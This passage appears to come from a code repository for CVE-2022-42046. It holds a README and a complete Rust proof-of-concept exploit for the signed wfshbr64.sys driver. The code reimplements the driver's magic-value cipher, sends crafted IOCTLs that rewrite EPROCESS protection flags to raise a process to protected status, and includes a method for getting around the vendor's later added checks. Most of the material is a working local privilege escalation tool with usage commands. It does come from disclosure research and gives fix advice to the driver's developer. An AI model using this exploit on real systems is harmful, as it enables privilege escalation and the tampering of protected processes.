            return in_safe_cached<F>(ldr_data_entry()->load_order_next()->DllBase);
        }
    };

}} // namespace li::detail

#endif // include guard

```

`LICENSE`:

```
MIT License

Copyright (c) 2022 Kento Oki

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# EvilWfshbr

[CVE-2022-42046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42046) Proof of Concept of wfshbr64.sys local privilege escalation

wfshbr64.sys and wfshbr32.sys specially crafted payload allows arbitrary user to perform bitwise operation with arbitrary EPROCESS offset and flags value to purposely elevate the game process to CodeGen Full protection by manipulating `EPROCESS.Protection` and `EPROCESS.SignatureLevel` flags (security hole as a feature).

The driver is signed by Microsoft hardware compatibility publisher that is submitted via Microsoft Hardware Program.

This project was co-researched with [@DoranekoSystems](https://github.com/DoranekoSystems)

### **There is a rich Rust CLI version available [here](wfsexploit)**

- https://www.virustotal.com/gui/file/b8807e365be2813b7eccd2e4c49afb0d1e131086715638b7a6307cd7d7e9556c
- https://www.virustotal.com/gui/file/89698cad598a56f9e45efffd15d1841e494a2409cc12279150a03842cd6bb7f3

# License

MIT. See [LICENSE](LICENSE)

# Suggestion (For Developer)

1. Use [`ObRegisterCallbacks`](https://learn.microsoft.com/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks) instead of forcefully elevating process protection by performing direct kernel object manipulation. There is a good example in [here](https://github.com/microsoft/Windows-driver-samples/tree/main/general/obcallback).

## 2. IRP

Do not reference IRP after completion. if you have driver verifier enabled you will get caught.

```cpp
IofCompleteRequest(Irp, IO_NO_INCREMENT); // IRP is freed here
return Irp->IoStatus.Status;
```

Instead you should use local variable.

```cpp
NTSTATUS status = STATUS_SUCCESS;
Irp->IoStatus.Status = status;
IofCompleteRequest(Irp, IO_NO_INCREMENT); // IRP is freed here
return status;
```

## 3. Context Process

It looks like you're checking null pointer against return value of `IoGetCurrentProcess`, but it never return null pointer by design so you do not have to check it.

```cpp
PEPROCESS CurrentProcess = IoGetCurrentProcess();
  if ( !CurrentProcess ) // no need to check for null pointer
    break;
```

# The Trick

A while after the report, the developer implemented sneaky "additional verification" to defeat our first PoC instead of stepping down from making security holes as a feature.

Checks added to:

- `IOCTL_WFSHBR_REMOVE_FLAG`
- `IOCTL_WFSHBR_ADD_FLAG`
- `IOCTL_WFSHBR_AND_FLAG`

```diff
case IOCTL_WFSHBR_ADD_FLAG: // 0xAA013884
      if ( !KwfsVerifyCaller(Buffer) ) // verify caller
        break;
-     if ( Buffer->ArbitraryEProcessOffset >= 0x1000 ) // offset limitation check
+     if ( !KwfsVerifyOffsetAndFlags(Buffer->ArbitraryEProcessOffset,
+                                    Buffer->DesiredFlags) ) // verify the offset and flags
        break;
      *(ULONG*)(IoGetCurrentProcess() + Buffer->ArbitraryEProcessOffset) |= Buffer->DesiredFlags;
```

## KwfsVerifyOffsetAndFlags

This routine is designed to be called every time the client requests modification of EPROCESS, and performs verification of `Offset` provided by `ArbitraryEProcessOffset` field in this PoC ― and also `Flags` provided by `DesiredFlags` field in this PoC.

The verification is quite simple as it counts `1` bits in every bits field of provided flags and if the count greater than eight it will fail.

Possible flags pattern map is just four:

- `22 00 00 00`
- `00 22 00 00`
- `00 00 22 00`
- `00 00 00 22`

That said, performing following operations 4 times can guarantee that the at least one of attempt should be successfull:

- Subtract the `ArbitraryEProcessOffset` field by index: `offset - index`,
- And adjust bits in `DesiredFlags` field by index: `flag << (index * 8)`.

The offset is decremented, so the bitfield adjustment would cause offset to adjust in the bitwise operators.

```cpp
*(ULONG*)(IoGetCurrentProcess() + offset) |= flags;
*(ULONG*)(IoGetCurrentProcess() + offset) &= ~flags;
```

We have added `WfsProtectProcessSupreme` and `WfsUnprotectProcessSupreme` functions which performs the attempt and defeated the new trick.

```cpp
enum KwfsState {
  KwfsStateOnceCall = 0,
  KwfsStateNeedsValueEquality = 1,
  KwfsStateValueHasBeenSet = 2,
};

bool KwfsVerifyOffsetAndFlags(_In_ ULONG offset, _In_ ULONG offset flags)
{
  if (KwfsState::KwfsState == KwfsState::KwfsStateOnceCall) {
    g_KwfsVerifyState = KwfsState::KwfsStateValueHasBeenSet;
    g_KwfsVerifyStateOffset = offset;
    g_KwfsVerifyStateFlags = flags;
    if (offset < 0x1000) { // offset limitation check moved here
      auto bitcount = 0;
      for (auto i = 0; i < 32; ++i) { // count `1` bits in flags
        if (flags & (1 << i)) {
          ++bitcount;
        }
      }
      if (bitcount <= 8) { // count must less than nine
        g_KwfsVerifyState = 1;
        return true;
      }
    }
  }
  else
  {
    if (g_KwfsVerifyState != KwfsState::KwfsStateValueHasBeenSet
     || offset != g_KwfsVerifyStateOffset
     || flags != g_KwfsVerifyStateFlags) {
      return false;
    }
  }
  return false;
}
```

```

`wfsexploit/Cargo.toml`:

```toml
[package]
publish = false
name = "wfsexploit"
description = "wfshbr64.sys and wfshbr32.sys specially crafted payload allows local privilege escalation"
readme = "README.md"
version = "0.1.0"
authors = ["Kento Oki <hrn832@protonmail.com>", "Kenjiro Ichise"]
edition = "2021"
homepage = "https://github.com/kkent030315/CVE-2022-42046"
repository = "https://github.com/kkent030315/CVE-2022-42046"
license-file = "LICENSE"

[dependencies]
clap = { version = "4.0.29", features = ["derive"] }
ntapi = "0.4.0"
winapi = { version = "0.3", features = ["fileapi",
                                        "handleapi",
                                        "winioctl",
                                        "ioapiset"] }
num = "0.4.0"

[dev-dependencies]
speculate = "0.1.2"

```

`wfsexploit/README.md`:

```md
# wfsexploit

This is a PoC writtn in Rust and allows you to use rich CLI features to make it what you like.

# Usage

```bash
> wfsexploit.exe -h

Usage: wfsexploit.exe [OPTIONS]

Options:
  -d, --device-name <DEVICE_NAME>  [default: \\.\htsysm7F34]
  -t, --prot-type <PROT_TYPE>      [default: ps-protected-type-protected] [possible values: ps-protected-type-none, ps-protected-type-protected-light, ps-protected-type-protected, ps-protected-type-max]
  -s, --prot-signer <PROT_SIGNER>  [default: ps-protected-signer-win-tcb] [possible values: ps-protected-signer-none, ps-protected-signer-authenticode, ps-protected-signer-code-gen, ps-protected-signer-antimalware, ps-protected-signer-lsa, ps-protected-signer-windows, ps-protected-signer-win-tcb, ps-protected-signer-win-system, ps-protected-signer-app, ps-protected-signer-max]
  -e, --exit-on-done
  -h, --help                       Print help information
  -V, --version                    Print version information
```

With the auguments you can specify what types of protection to elevate by commandline.

For example, below command will elevate the PoC process into WinTcb PPL.

```bash
wfsexploit.exe -t="ps-protected-type-protected-light" -s="ps-protected-signer-win-tcb"
```

# Build

```bash
cargo build --release
```

```

`wfsexploit/src/main.rs`:

```rs
#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]
#![allow(dead_code, unused_assignments, non_upper_case_globals)]

#[cfg(test)]
mod tests;

use clap::{Parser, ValueEnum};
use ntapi::{
    ntpsapi::{NtQueryInformationProcess, PS_PROTECTED_SIGNER, PS_PROTECTED_TYPE, PS_PROTECTION},
    ntrtl::RtlGetVersion,
};
use num::FromPrimitive;
use std::{ffi::OsStr, os::windows::ffi::OsStrExt};
use winapi::{
    shared::{
        minwindef::BOOL,
        ntdef::{NTSTATUS, NT_SUCCESS},
        ntstatus::STATUS_NOT_SUPPORTED,
    },
    um::{
        fileapi::{CreateFileW, OPEN_EXISTING},
        handleapi::INVALID_HANDLE_VALUE,
        ioapiset::DeviceIoControl,
        processthreadsapi::GetCurrentProcess,
        winnt::{GENERIC_READ, GENERIC_WRITE, HANDLE, OSVERSIONINFOW},
    },
};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long, default_value = "\\\\.\\htsysm7F34")]
    device_name: String,

    #[arg(short = 't', long, value_enum, default_value_t = PsProtectedType::PsProtectedTypeProtected)]
    prot_type: PsProtectedType,

    #[arg(short = 's', long, value_enum, default_value_t = PsProtectedSigner::PsProtectedSignerWinTcb)]
    prot_signer: PsProtectedSigner,

    #[arg(short, long, default_value_t = false)]
    exit_on_done: bool,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrQuerySeed {
    is_success: u32,
    seed: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrQueryRandom1 {
    is_success: u32,
    value_low: u32,
    value_high: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrQueryRandom2 {
    is_success: u32,
    value: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrFlagOperation {
    offset: u32,
    flags: u32,
    magic: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrCommonResult {
    is_success: u32,
}

#[derive(Debug)]
pub enum WfshbrFlagOperationType {
    Add = 0,
    Remove = 1,
    And = 2,
}

#[derive(Debug)]
pub struct NtosOffsets {
    protection: u32,
}

#[derive(Clone, ValueEnum)]
enum PsProtectedSigner {
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode = 1,
    PsProtectedSignerCodeGen = 2,
    PsProtectedSignerAntimalware = 3,
    PsProtectedSignerLsa = 4,
    PsProtectedSignerWindows = 5,
    PsProtectedSignerWinTcb = 6,
    PsProtectedSignerWinSystem = 7,
    PsProtectedSignerApp = 8,
    PsProtectedSignerMax = 9,
}

impl std::fmt::Debug for PsProtectedSigner {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            PsProtectedSigner::PsProtectedSignerNone => write!(f, "PsProtectedSignerNone"),
            PsProtectedSigner::PsProtectedSignerAuthenticode => {
                write!(f, "PsProtectedSignerAuthenticode")
            }
            PsProtectedSigner::PsProtectedSignerCodeGen => write!(f, "PsProtectedSignerCodeGen"),
            PsProtectedSigner::PsProtectedSignerAntimalware => {
                write!(f, "PsProtectedSignerAntimalware")
            }
            PsProtectedSigner::PsProtectedSignerLsa => write!(f, "PsProtectedSignerLsa"),
            PsProtectedSigner::PsProtectedSignerWindows => write!(f, "PsProtectedSignerWindows"),
            PsProtectedSigner::PsProtectedSignerWinTcb => write!(f, "PsProtectedSignerWinTcb"),
            PsProtectedSigner::PsProtectedSignerWinSystem => {
                write!(f, "PsProtectedSignerWinSystem")
            }
            PsProtectedSigner::PsProtectedSignerApp => write!(f, "PsProtectedSignerApp"),
            PsProtectedSigner::PsProtectedSignerMax => write!(f, "PsProtectedSignerMax"),
        }
    }
}

impl FromPrimitive for PsProtectedSigner {
    fn from_u32(n: u32) -> Option<PsProtectedSigner> {
        return match n {
            0 => Some(PsProtectedSigner::PsProtectedSignerNone),
            1 => Some(PsProtectedSigner::PsProtectedSignerAuthenticode),
            2 => Some(PsProtectedSigner::PsProtectedSignerCodeGen),
            3 => Some(PsProtectedSigner::PsProtectedSignerAntimalware),
            4 => Some(PsProtectedSigner::PsProtectedSignerLsa),
            5 => Some(PsProtectedSigner::PsProtectedSignerWindows),
            6 => Some(PsProtectedSigner::PsProtectedSignerWinTcb),
            7 => Some(PsProtectedSigner::PsProtectedSignerWinSystem),
            8 => Some(PsProtectedSigner::PsProtectedSignerApp),
            9 => Some(PsProtectedSigner::PsProtectedSignerMax),
            _ => None,
        };
    }

    fn from_i64(n: i64) -> Option<PsProtectedSigner> {
        return self::FromPrimitive::from_u32(n as _);
    }

    fn from_u64(n: u64) -> Option<PsProtectedSigner> {
        return self::FromPrimitive::from_u32(n as _);
    }
}

#[derive(Clone, ValueEnum)]
enum PsProtectedType {
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2,
    PsProtectedTypeMax = 3,
}

impl std::fmt::Debug for PsProtectedType {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            PsProtectedType::PsProtectedTypeNone => write!(f, "PsProtectedTypeNone"),
            PsProtectedType::PsProtectedTypeProtectedLight => {
                write!(f, "PsProtectedTypeProtectedLight")
            }
            PsProtectedType::PsProtectedTypeProtected => write!(f, "PsProtectedTypeProtected"),
            PsProtectedType::PsProtectedTypeMax => {
                write!(f, "PsProtectedTypeMax")
            }
        }
    }
}

impl FromPrimitive for PsProtectedType {
    fn from_u32(n: u32) -> Option<PsProtectedType> {
        return match n {
            0 => Some(PsProtectedType::PsProtectedTypeNone),
            1 => Some(PsProtectedType::PsProtectedTypeProtectedLight),
            2 => Some(PsProtectedType::PsProtectedTypeProtected),
            3 => Some(PsProtectedType::PsProtectedTypeMax),
            _ => None,
        };
    }

    fn from_i64(n: i64) -> Option<PsProtectedType> {
        return self::FromPrimitive::from_u32(n as _);
    }

    fn from_u64(n: u64) -> Option<PsProtectedType> {
        return self::FromPrimitive::from_u32(n as _);
    }
}

struct ProcessProtection(PS_PROTECTION);
impl std::fmt::Debug for ProcessProtection {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        writeln!(
            f,
            "{:?}, {}, {:?}",
            PsProtectedType::from_u32(self.0.Type() as u32),
            self.0.Audit() != 0,
            PsProtectedSigner::from_u32(self.0.Signer() as u32)
        )?;
        return Ok(());
    }
}

const IOCTL_WFSHBR_QUERY_SEED: u32 = 0xAA013840;
const IOCTL_WFSHBR_REMOVE_FLAG: u32 = 0xAA013880;
const IOCTL_WFSHBR_ADD_FLAG: u32 = 0xAA013884;
const IOCTL_WFSHBR_AND_FLAG: u32 = 0xAA013888;
const IOCTL_WFSHBR_QUERY_RANDOM_1: u32 = 0xAA0138C0;
const IOCTL_WFSHBR_QUERY_RANDOM_2: u32 = 0xAA0138C4;

const WINVER_WIN11_22H2: u32 = 22621;
const WINVER_WIN11_21H2: u32 = 22000;
const WINVER_WIN10_21H2: u32 = 19044;
const WINVER_WIN10_21H1: u32 = 19043;
const WINVER_WIN10_20H2: u32 = 19042;
const WINVER_WIN10_2004: u32 = 19041;
const WINVER_WIN10_1909: u32 = 18363;
const WINVER_WIN10_1903: u32 = 18362;
const WINVER_WIN10_1809: u32 = 17763;
const WINVER_WIN10_1803: u32 = 17134;
const WINVER_WIN10_1709: u32 = 16299;
const WINVER_WIN10_1703: u32 = 15063;
const WINVER_WIN10_1607: u32 = 14393;
const WINVER_WIN10_1511: u32 = 10586;
const WINVER_WIN10_1507: u32 = 10240;

const ProcessProtectionInformation: u32 = 0x3D;

fn to_wide_chars(s: &str) -> Vec<u16> {
    return OsStr::new(s)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect::<Vec<_>>();
}

fn kwfs_emul_check_flags(flags: u32) -> bool {
    let result: bool = flags.count_ones() < 9;
    return result;
}

fn open_device(device_name: &str) -> std::io::Result<HANDLE> {
    let device_name_wchar = to_wide_chars(device_name);
    let handle: HANDLE = unsafe {
        CreateFileW(
            device_name_wchar.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            std::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        )
    };
    if handle == INVALID_HANDLE_VALUE {
        return Err(std::io::Error::last_os_error());
    }
    return Ok(handle);
}

fn wfs_encrypt_phase2(pre_plain: u16) -> u32 {
    let mut current_pre_plain: u32 = pre_plain.into();
    let mut bitwise_pre_plain: u32 = 0;
    current_pre_plain += 1;
    current_pre_plain = current_pre_plain.wrapping_mul(0xB1F7);
    let temp: u64 = u64::from(0xFFFF0001 as u64).wrapping_mul(u64::from(current_pre_plain));
    bitwise_pre_plain = u32::from(temp.wrapping_shr(32) as u32);
    bitwise_pre_plain = bitwise_pre_plain.wrapping_shr(0x10);
    bitwise_pre_plain = bitwise_pre_plain.wrapping_mul(0x10001);
    current_pre_plain -= bitwise_pre_plain;
    current_pre_plain -= 1;
    return current_pre_plain;
}

fn wfs_encrypt_phase0(round: u32, plain: u32) -> u32 {
    let mut current_round: u32 = round;
    let mut cipher: u32 = 0;
    let mut xor_cipher: u32 = plain;
    let mut bitwise_cipher: u32 = round;
    while {
        if (current_round & 1) == 1 {
            cipher ^= xor_cipher;
        }
        bitwise_cipher = xor_cipher;
        xor_cipher = xor_cipher.wrapping_mul(2);
        bitwise_cipher = bitwise_cipher.wrapping_shr(0x1F);
        if bitwise_cipher != 0 {
            xor_cipher ^= 0x357935E9;
        }
        current_round = current_round.wrapping_shr(1);
        current_round != 0
    } {}
    return cipher;
}

fn wfs_encrypt_phase1(pre_plain: u32) -> u32 {
    let cipher1: u32 = wfs_encrypt_phase2((pre_plain & 0x0000FFFF) as _);
    let cipher2: u32 = wfs_encrypt_phase2(pre_plain.wrapping_shr(16) as _);
    let result: u32 = u32::from(cipher2.wrapping_shl(16)) + u32::from(cipher1);
    return result;
}

fn wfs_generate_magic(seed: u32, process_id: u32) -> u32 {
    let cipher_phase0: u32 = wfs_encrypt_phase0(0x77FD097E, seed + process_id);
    let cipher_phase1: u32 = wfs_encrypt_phase1(cipher_phase0);
    return cipher_phase1;
}

fn wfs_query_seed(device: HANDLE) -> std::io::Result<u32> {
    let mut bytes_returned: u32 = 0;
    let mut query: WfshbrQuerySeed = unsafe { std::mem::zeroed() };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            IOCTL_WFSHBR_QUERY_SEED,
            std::ptr::null_mut(),
            0,
            &mut query as *mut _ as _,
            std::mem::size_of::<WfshbrQuerySeed>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    return Ok(query.seed);
}

fn wfs_query_random1(device: HANDLE) -> std::io::Result<u64> {
    let mut bytes_returned: u32 = 0;
    let mut query: WfshbrQueryRandom1 = unsafe { std::mem::zeroed() };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            IOCTL_WFSHBR_QUERY_RANDOM_1,
            std::ptr::null_mut(),
            0,
            &mut query as *mut _ as _,
            std::mem::size_of::<WfshbrQueryRandom1>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    let value64: u64 =
        (u64::from(query.value_high).wrapping_shl(32) | u64::from(query.value_low)).into();
    return Ok(value64);
}

fn wfs_query_random2(device: HANDLE) -> std::io::Result<u32> {
    let mut bytes_returned: u32 = 0;
    let mut query: WfshbrQueryRandom2 = unsafe { std::mem::zeroed() };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            IOCTL_WFSHBR_QUERY_RANDOM_2,
            std::ptr::null_mut(),
            0,
            &mut query as *mut _ as _,
            std::mem::size_of::<WfshbrQueryRandom2>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    return Ok(query.value);
}

fn wfs_flag_operation(
    device: HANDLE,
    operation_type: WfshbrFlagOperationType,
    seed: u32,
    offset: u32,
    flags: u32,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    let mut bytes_returned: u32 = 0;
    let mut operation: WfshbrFlagOperation = unsafe { std::mem::zeroed() };
    operation.offset = match bits_map_index {
        Some(index) => offset - index,
        None => offset,
    };
    operation.flags = match bits_map_index {
        Some(index) => flags.wrapping_shl(index * 8),
        None => flags,
    };
    assert!(kwfs_emul_check_flags(flags));
    let process_id: u32 = std::process::id();
    operation.magic = wfs_generate_magic(seed, process_id);
    let mut result: WfshbrCommonResult = unsafe { std::mem::zeroed() };
    let control_code: u32 = match operation_type {
        WfshbrFlagOperationType::Add => IOCTL_WFSHBR_ADD_FLAG,
        WfshbrFlagOperationType::Remove => IOCTL_WFSHBR_REMOVE_FLAG,
        WfshbrFlagOperationType::And => IOCTL_WFSHBR_AND_FLAG,
    };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            control_code,
            &mut operation as *mut _ as _,
            std::mem::size_of::<WfshbrFlagOperation>() as _,
            &mut result as *mut _ as _,
            std::mem::size_of::<WfshbrCommonResult>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    if operation.offset == 0 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "driver indicated faiure",
        ));
    }
    return Ok(());
}

fn set_process_protection(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
    unprotect: bool,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    let mut protection: PS_PROTECTION = unsafe { std::mem::zeroed() };
    protection.set_Type(prot_type as _);
    protection.set_Audit(prot_audit);
    protection.set_Signer(prot_signer as _);
    let offsets: NtosOffsets = parse_offsets()?;
    return wfs_flag_operation(
        device,
        match unprotect {
            true => WfshbrFlagOperationType::Remove,
            false => WfshbrFlagOperationType::Add,
        },
        seed,
        offsets.protection,
        protection.Level as _,
        bits_map_index,
    );
}

fn protect_process(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    return set_process_protection(
        device,
        seed,
        prot_type,
        prot_audit,
        prot_signer,
        false,
        bits_map_index,
    );
}

fn protect_process_supreme(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
) -> std::io::Result<()> {
    for i in 0u32..3u32 {
        if let Ok(value) =
            protect_process(device, seed, prot_type, prot_audit, prot_signer, Some(i))
        {
            return Ok(value);
        }
    }

    return Err(std::io::Error::new(
        std::io::ErrorKind::Other,
        "no bitset flag map succeeded",
    ));
}

fn unprotect_process(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    return set_process_protection(
        device,
        seed,
        prot_type,
        prot_audit,
        prot_signer,
        true,
        bits_map_index,
    );
}

fn unprotect_process_supreme(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
) -> std::io::Result<()> {
    for i in 0u32..3u32 {
        if let Ok(value) =
            unprotect_process(device, seed, prot_type, prot_audit, prot_signer, Some(i))
        {
            return Ok(value);
        }
    }

    return Err(std::io::Error::new(
        std::io::ErrorKind::Other,
        "no bitset flag map succeeded",
    ));
}

fn get_system_version() -> std::io::Result<(u32, u32, u32)> {
    let mut version_info: OSVERSIONINFOW = unsafe { std::mem::zeroed() };
    version_info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as _;
    let status: NTSTATUS = unsafe { RtlGetVersion(&mut version_info) };
    if !NT_SUCCESS(status) {
        return Err(std::io::Error::from_raw_os_error(status));
    }
    return Ok((
        version_info.dwMajorVersion,
        version_info.dwMinorVersion,
        version_info.dwBuildNumber,
    ));
}

fn parse_offsets() -> std::io::Result<NtosOffsets> {
    let mut offsets: NtosOffsets = unsafe { std::mem::zeroed() };
    let (major, minor, build) = get_system_version()?;
    if ((major * 10) + minor) != 100 {
        return Err(std::io::Error::from_raw_os_error(STATUS_NOT_SUPPORTED));
    }
    let _ = match build {
        WINVER_WIN11_22H2 | WINVER_WIN11_21H2 | WINVER_WIN10_21H2 | WINVER_WIN10_21H1
        | WINVER_WIN10_20H2 | WINVER_WIN10_2004 => {
            offsets.protection = 0x87A;
        }
        WINVER_WIN10_1909 | WINVER_WIN10_1903 => {
            offsets.protection = 0x6FA;
        }
        WINVER_WIN10_1809 | WINVER_WIN10_1803 | WINVER_WIN10_1709 | WINVER_WIN10_1703 => {
            offsets.protection = 0x6CA;
        }
        WINVER_WIN10_1607 => {
            offsets.protection = 0x6C2;
        }
        WINVER_WIN10_1511 => {
            offsets.protection = 0x6B2;
        }
        WINVER_WIN10_1507 => {
            offsets.protection = 0x6AA;
        }
        _ => return Err(std::io::Error::from_raw_os_error(STATUS_NOT_SUPPORTED)),
    };
    return Ok(offsets);
}

fn get_process_protection() -> std::io::Result<ProcessProtection> {
    let mut return_length: u32 = 0;
    let mut protection: PS_PROTECTION = unsafe { std::mem::zeroed() };
    let status: NTSTATUS = unsafe {
        NtQueryInformationProcess(
            GetCurrentProcess(),
            ProcessProtectionInformation,
            &mut protection as *mut _ as _,
            std::mem::size_of::<PS_PROTECTION>() as _,
            &mut return_length,
        )
    };
    if !NT_SUCCESS(status) {
        return Err(std::io::Error::from_raw_os_error(status));
    }
    return Ok(ProcessProtection(protection));
}

fn main() -> std::io::Result<()> {
    let args: Args = Args::parse();
    let (major, minor, build) = get_system_version().expect("error while parsing system version");
    println!("system: major({}) minor({}) build({})", major, minor, build);
    let offsets = parse_offsets().expect("your system is not supported");
    println!("offsets: {:?}", offsets);
    let handle: HANDLE = open_device(&args.device_name).expect("error while opening device");
    println!("device opened: {:p}", handle);
    let seed: u32 = wfs_query_seed(handle).expect("error while querying seed");
    println!("seed acquired: {:#x}", seed);
    let random1: u64 = wfs_query_random1(handle).expect("error while querying random1");
    println!("random1 acquired: {:#x}", random1);
    let random2: u32 = wfs_query_random2(handle).expect("error while querying random2");
    println!("random2 acquired: {:#x}", random2);
    let process_id: u32 = std::process::id();
    let magic: u32 = wfs_generate_magic(seed, process_id);
    println!("magic generated: {:#x}", magic);
    let mut current_prot: ProcessProtection =
        get_process_protection().expect("error while getting process protection");
    println!("current protection: {:?}", current_prot);
    let _ = protect_process_supreme(handle, seed, args.prot_type as _, 0, args.prot_signer as _)?;
    current_prot = get_process_protection().expect("error while getting process protection");
    println!("current protection: {:?}", current_prot);
    let _ = unprotect_process_supreme(handle, seed, args.prot_type as _, 0, args.prot_signer as _)?;
    current_prot = get_process_protection().expect("error while getting process protection");
    println!("current protection: {:?}", current_prot);
    if !args.exit_on_done {
        println!("waiting for inputs..");
        let _ = std::io::stdin().read_line(&mut String::new()).unwrap();
    }
    return Ok(());
}

```

`wfsexploit/src/tests/crypt.rs`:

```rs
#![cfg(test)]

extern crate speculate;

use speculate::speculate;

speculate! {
    describe "crypt" {
        it "should generate correct magic (0, 53452)" {
            let magic: u32 = crate::wfs_generate_magic(0, 53452);
            assert_eq!(magic, 0xBEEBD107);
        }

        it "should generate correct magic (0, 24824)" {
            let magic: u32 = crate::wfs_generate_magic(0, 24824);
            assert_eq!(magic, 0x27AB4B4F);
        }

        it "should generate correct magic (0, 39764)" {
            let magic: u32 = crate::wfs_generate_magic(0, 39764);
            assert_eq!(magic, 0x106CBAEA);
        }

        it "should generate correct magic (0, 5168)" {
            let magic: u32 = crate::wfs_generate_magic(0, 5168);
            assert_eq!(magic, 0xF348EB1);
        }

        it "should generate correct magic (0, 40220)" {
            let magic: u32 = crate::wfs_generate_magic(0, 40220);
            assert_eq!(magic, 0x24259BF8);
        }
    }
}

```

`wfsexploit/src/tests/mod.rs`:

```rs
pub mod crypt;
pub mod structs_x64;

```

`wfsexploit/src/tests/structs_x64.rs`:

```rs
#![cfg(test)]

extern crate speculate;

use speculate::speculate;
use std::mem::{align_of, size_of};

speculate! {
    describe "structs (x64)" {
        it "WfshbrQuerySeed" {
            assert_eq!(size_of::<crate::WfshbrQuerySeed>(), 0x8);
            assert_eq!(align_of::<crate::WfshbrQuerySeed>(), 0x4);
        }

        it "WfshbrQueryRandom1" {
            assert_eq!(size_of::<crate::WfshbrQueryRandom1>(), 0xC);
            assert_eq!(align_of::<crate::WfshbrQueryRandom1>(), 0x4);
        }

        it "WfshbrQueryRandom2" {
            assert_eq!(size_of::<crate::WfshbrQueryRandom2>(), 0x8);
            assert_eq!(align_of::<crate::WfshbrQueryRandom2>(), 0x4);
        }

        it "WfshbrFlagOperation" {
            assert_eq!(size_of::<crate::WfshbrFlagOperation>(), 0xC);
            assert_eq!(align_of::<crate::WfshbrFlagOperation>(), 0x4);
        }

        it "WfshbrCommonResult" {
            assert_eq!(size_of::<crate::WfshbrCommonResult>(), 0x4);
            assert_eq!(align_of::<crate::WfshbrCommonResult>(), 0x4);
        }
    }
}

```